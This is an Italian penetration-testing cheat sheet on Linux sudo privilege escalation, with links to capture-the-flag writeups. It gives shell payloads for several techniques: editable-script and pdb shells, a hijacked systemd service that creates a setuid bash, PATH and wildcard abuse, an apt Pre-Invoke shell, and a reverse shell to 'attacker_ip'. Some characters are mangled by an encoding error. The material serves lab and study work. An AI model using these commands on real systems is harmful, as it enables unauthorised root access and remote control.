#Privesc_Linux

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Enumerazione]]
- [[#Pieni permessi (`(ALL ALL) ALL`)]]
- [[#Sudo senza Password (`NOPASSWD:`)]]
- [[#Escalation tramite Script Editabili]]
- [[#Percorso relativo]]
	1. [[#Directory corrente]]
	2. [[#Variabile PATH]]
- [[#Wildcard (`*`)]]
	1. [[#File Globbing Wildcard]]
	2. [[#Command Wildcard]]
- [[#Moduli vulnerabili]]
	1. [[#pdb]]
- [[#GTFOBins]]
- [[#Versioni vulnerabili]]
- [[#Scripts Vulnerabili]]
- [[#Altri casi]]
	1. [[#Docker]]

---
---
---
### Introduzione
Il comando `sudo` permette a un utente di eseguire comandi con *privilegi elevati,* solitamente come root.  
Durante un penetration test, analizzare i permessi sudo Ã¨ cruciale per determinare se un utente puÃ² ottenere una shell root direttamente o tramite comandi intermedi.

---
### Enumerazione
Visualizza i permessi dellâ€™utente corrente:

```
sudo -l
```

Esempio output:

```
User username may run the following commands on this host:  
(ALL : ALL) ALL
(ALL) NOPASSWD: /usr/bin/python3, /usr/bin/less
```

---
### Pieni permessi (`(ALL : ALL) ALL`)
L'utente puÃ² eseguire qualsiasi comando come utente privilegiato (root).

ðŸ“šâ€‹ Writeups:
- [[Linux#Blocky| Blocky]],[[Linux#Blogger| Blogger]],[[Linux#Bashed| Bashed]],[[Linux#Payday| Payday]],[[Linux#Silver Platter| Silver Platter]],[[Linux#Stapler| Stapler]],

---
### Sudo senza Password (`NOPASSWD:`)
Se lâ€™output di `sudo -l` include `NOPASSWD:`, significa che puoi eseguire il comando **senza bisogno di password**, anche da script.

--- 
### Escalation tramite Script Editabili
Attenzione ai casi in cui puoi eseguire uno **script editabile** con `sudo`.

Esempio:

```
(username) NOPASSWD: /usr/bin/python3 /home/valerio/backup.py
```

Se puoi modificare `backup.py`, aggiungi una shell:

```
import os os.system("/bin/bash")
```

Esegui:

```
sudo /usr/bin/python3 /home/valerio/backup.py
```

ðŸ“šâ€‹ Writeups:
- [[Linux#Nibble| Nibble]],[[Linux#Walla| Walla]],[[Linux#LaVita| LaVita]],[[Linux#Lazy admin| Lazy admin]],[[Linux#SPX| SPX]],[[Linux#BitForge| BitForge]],[[Linux#Monitored| Monitored]],[[Linux#Editorial| Editorial]],

#### Service File Hijacking
Questa tecnica sfrutta il fatto che un utente **non privilegiato ha i permessi di scrittura** su un file di servizio `systemd` (solitamente in `/etc/systemd/system/` o `/lib/systemd/system/`).  
L'attaccante puÃ² **modificare il contenuto del file di servizio** e inserire un payload arbitrario (come uno script di root shell), che verrÃ  **eseguito con privilegi root** al prossimo avvio del servizio o reboot.

Trovi un file `.service` scrivibile e modifichi il file per inserire un comando malevolo:

```
[Service]
ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```

Riavvii od attendi il riavvio della macchina.

ðŸ“šâ€‹ Writeups:
- [[Linux#Zeno| Zeno]],[[Linux#Hetemit| Hetemit]],[[Linux#Scrutiny| Scrutiny]],[[Linux#SpiderSociety| SpiderSociety]],

---
### Percorso relativo
#### Directory corrente
Un errore comune di configurazione Ã¨ permettere lâ€™esecuzione di comandi `sudo` specificando un **path relativo** invece di uno assoluto. Ad esempio:

```
(username) NOPASSWD: ./deploy.sh
```

In questo caso, lâ€™utente puÃ² **eseguire con privilegi root qualsiasi file chiamato `deploy.sh`** presente nella directory corrente. Basta creare un file con lo stesso nome e contenuto malevolo, poi:

```
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' > deploy.sh
chmod +x deploy.sh sudo ./deploy.sh`
```

Il sistema non verifica lâ€™integritÃ  o la provenienza del file, fidandosi del path relativo. Questo tipo di errore rientra nelle **misconfigurazioni sudo critiche** perchÃ© consente allâ€™utente di sostituire arbitrariamente l'eseguibile atteso.
#### Variabile PATH
Un errore frequente dei file permessi SUDO, Ã¨ quello di affidarsi alla variabile di ambiente[[ðŸ”¡ Glossario#Variabili Globali| PATHÂ°]]. Se un eseguibile con SUDO richiama un comando generico come `cp`, `ls`, `cat`, senza `/usr/bin/cp` o simili, lâ€™attaccante puÃ² **manipolare `PATH` per eseguire un comando arbitrario con privilegi root**.

Supponiamo di avere lo script `vuln.sh` che esegua il binario `/usr/bin/backup.sh` con SUDO richiamato all'interno del file senza path assoluto quindi `backup.sh`:

```
export PATH=/tmp:$PATH #Inseriamo una directory sotto il nostro controllo come /tmp
echo "/bin/bash" > ./backup.sh #Creiamo il binario malevolo
chmod +x backup.sh
sh vuln.sh
```


---
### Wildcard (`*`)
#### File Globbing Wildcard
Le **wildcard (`*`, `?`, `[a-z]`, ecc.)** sono metacaratteri usati dalla shell per **espandere automaticamente i nomi dei file**, e possono essere **pericolose** se usate senza attenzione nei comandi concessi via `sudo`.

Esempio di configurazione vulnerabile:

```
(username) NOPASSWD: /bin/tar -cf /tmp/backup.tar *
```

Lâ€™utente puÃ² abusarne creando un **file malevolo con un'opzione tar incorporata**.

ðŸ“šâ€‹ Writeups:
- [[Linux#CmesS| CmesS]],[[Linux#Cockpit| Cockpit]],
#### Command Wildcard
Nel file `/etc/sudoers`, il carattere `*` ha un significato diverso: indica un **pattern** valido per piÃ¹ **comandi** o **argomenti** consentiti.

Esempio:

```
username ALL=(ALL) NOPASSWD: /usr/bin/apt *
```

Questo consente a `username` di eseguire **qualsiasi comando cmd, come:

```
sudo /usr/bin/apt update
sudo /usr/bin/apt install nmap
```

In molti casi, questa wildcard **sui comandi** puÃ² essere abusata per eseguire payload contenuti nei binari, come ottenere una shell da:

```
sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
```

ðŸ“šâ€‹ Writeups:
- [[Linux#Armageddon| Armageddon]],[[Linux#Postfish| Postfish]],

---
### Moduli vulnerabili
Alcune applicazioni, script o ambienti eseguibili includono **moduli Python o interpreti** che possono essere abusati per ottenere lâ€™esecuzione di codice con privilegi elevati.
#### pdb
Un caso emblematico Ã¨ lâ€™inclusione del modulo *pdb* (Python Debugger), che, se presente in uno script eseguibile via `sudo`, puÃ² essere sfruttato per ottenere una shell di debug come utente root.

Esempio classico:

```
sudo /usr/bin/python3 /opt/remote-manage.py
```

Se lo script genera un errore e importa `pdb`, lâ€™attaccante puÃ² ottenere un prompt interattivo:

```
(Pdb) !import os; os.system("/bin/bash")
```

Il modulo caricato Ã¨ in sÃ© uno strumento di esecuzione, nonostante non venga esplicitamente concepito come una backdoor.

ðŸ“šâ€‹ Writeups:
- [[Linux#Forge| Forge]],

---
### GTFOBins
[GTFOBins](https://gtfobins.github.io) contiene una raccolta di comandi sfruttabili via sudo per ottenere shell o eseguire file arbitrari. 

ðŸ“šâ€‹ Writeups:
- [[Linux#OpenAdmin| OpenAdmin]],[[Linux#Swagshop| Swagshop]],[[Linux#Knife| Knife]],[[Linux#Shocker| Shocker]],[[Linux#Traverxec| Traverxec]],[[Linux#Pelican| Pelican]],[[Linux#ScriptKiddies| ScriptKiddies]],[[Linux#Zab| Zab]],[[Linux#Sunday| Sunday]],[[Linux#DailyBugle| DailyBugle]],[[Linux#Tomghost| TomGhost]],[[Linux#FunBoxEasy| FunBoxEasy]],[[Linux#Potato| Potato]],[[Linux#CozyHosting| CozyHosting]],[[Linux#UpdDown| UpDown]]

---
### Versioni vulnerabili
Per controllare la versione utilizzare `sudo -V`.

| **Versione** | **CVE** | **Writeup**                   |
| ------------ | ------- | ----------------------------- |
| < 1.8.28     |         | [[Linux#Blunder\| Blunder]], |

---
### Scripts Vulnerabili

| **Versione** | **CVE**                                                           | **Writeup**                       |
| ------------ | ----------------------------------------------------------------- | --------------------------------- |
| `apport-cli` | [CVE-2023â€“1326](https://github.com/diego-tella/CVE-2023-1326-PoC) | [[Linux#Devvortex\| Devvortex]], |


---
### Altri casi
#### Docker
L'utente ha i permessi elevati di esecuzione sui comandi `docker`:

```
sudo docker ...
```

ðŸ“šâ€‹ Writeups:
- [[Linux#Data| Data]],

